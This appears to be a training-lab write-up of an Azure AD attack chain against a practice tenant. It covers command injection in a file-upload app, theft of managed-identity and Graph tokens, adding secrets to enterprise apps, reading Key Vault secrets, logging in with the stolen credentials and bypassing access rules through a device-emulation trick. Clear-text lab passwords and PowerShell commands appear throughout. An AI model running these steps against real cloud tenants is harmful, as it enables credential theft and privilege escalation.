 # Kill Chain 3
 ![KillChain](/img/KC-3.png "Kill Chain 3")

  ![KillChain](/img/KC3-ThreatMatrix.png "Kill Chain TheatMatrix")

# Objective 12, 18, 22

1. Abuse the vulnerable application in the defcorphq tenant `https://virusscanner.azurewebsites.net`. Exploit this website and upload malicious file and OS command injection attack.
2. Execute uploaded malicious file and extract managed identity access token and graph token
 ![KillChain](/img/KC-3_1.png "Kill Chain 3")
3. Use both the tokens and client ID with Az PowerShell and check the resources accessible to the managed identity.
```powershell
$token = 'eyJ0eX..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2
```
4. List resources that we have access to and got an error that means the managed identity has no rights of the Azure resources.
```powershell
Get-AzResource
```
 ![KillChain](/img/KC-3_2.png "Kill Chain 3")
5. Check if we can abuse any of the Enterprise apps(service principals) that we have listed above is to check if we can add credentials to any.
  Theoritically, we should be able to list roles assigned to the enterprise apps by calling the API
  `https;//graph.microsoft.com/v1.0/servicePrincipals/{ID}/appRoleAssignments`

  You can use the `Add-AzADAppSecret.ps`. This script tries to add a secret to all the enterprise applications and shows the successful ones;
  ```powershell
  . C:\AzAD\Tools\Add-AzADAppSecret.ps1
  Add-AzADAppSecret -GraphToken $graphtoken -Verbose
  ```
  ![KillChain](/img/KC-3_2.png "Kill Chain 3")
6. We found out that the managed identity for the app has permissions to add secrets to the enterprise application `fileapp`
   **Managed identities are special service principals** that means we can enumerate the service principals in Azure AD and check the service principal that the AppId belongs to... 

   ![KillChain](/img/KC-3_3.png "Kill Chain 3")
   ```powershell
   Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
   $passwd = ConvertTo-SecureString "SuperS3Cr31PAssw0rd!@l33t" -AsPlainText -Force
   $creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com",$passwd)
   Connect-AzureAD -Credentials $creds
   Get-AzureADServicePrincipal -All $true | ?{$_.AppId -eq 62e44426-5c46-4e3c-8a89-f461d5d586f2"} | fl
   ```
   So the token we got is actually for the managed identity of the function app **`processfile`**
   In this case, the `processfile` function app is processing the fileuploads to the virusscanner app service.
  ![KillChain](/img/KC-3_4.png "Kill Chain 3")
  ![KillChain](/img/KC-3_5.png "Kill Chain 3")
7. Now, list the resources readable by the service principal.
   ```powershell
   Get-AzResource
  ```
  Access to a key vault! Check if we can list and read any secrets!
  ```powershell
  Get-AzKeyVaultSecret -VaultName credvault-fileapp
  Get-AzKeyVaultSecret -VaultName credvault-fileapp -Name MobileUsersBackup -AsPlainText
  ```
  ![KillChain](/img/KC-3_6.png "Kill Chain 3")
8. Authenticate with the credentials;
```powershell
$password = ConvertTo-SecureString '!@Ka%%ya71&*FG2243gs49' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DavidDHenriques@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds
```
Bypass the login with pressing `F12` on the browser and change to `Apple IPad` on toggle device toolbar and login.
![KillChain](/img/KC-3_7.png "Kill Chain 3")
9. Look at the deployment template and will find that the template is trying to execute a command during demployment of a VM and that contains a clear-text password.
![KillChain](/img/KC-3_8.png "Kill Chain 3")


# Use the Graph API token with the REST API to list all Enterprise Apps.
```powershell
$Token = 'eyJ0eX..'
$URI = ' https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
  }  
}
(Invoke-RestMethod @RequestParams).value
```